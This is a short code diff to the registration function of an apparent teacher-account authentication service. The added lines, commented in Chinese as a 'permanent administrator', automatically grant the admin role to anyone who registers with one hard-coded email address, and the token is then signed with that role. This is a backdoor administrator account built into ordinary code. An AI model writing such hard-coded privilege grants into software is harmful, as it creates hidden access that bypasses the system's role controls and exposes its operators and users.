@@ -19,6 +19,13 @@ export const authService = {
     const passwordHash = bcrypt.hashSync(password, 12);
     const id = crypto.randomUUID();
     const teacher = teacherRepo.create(id, email, passwordHash, displayName);
+
+    // 永久管理员：505694933@qq.com 自动获得 admin 角色
+    if (email === '505694933@qq.com' && teacher.role !== 'admin') {
+      teacherRepo.setRole(id, 'admin');
+      teacher.role = 'admin';
+    }
+
     const token = signToken(id, teacher.role);
 
     return { token, teacher };
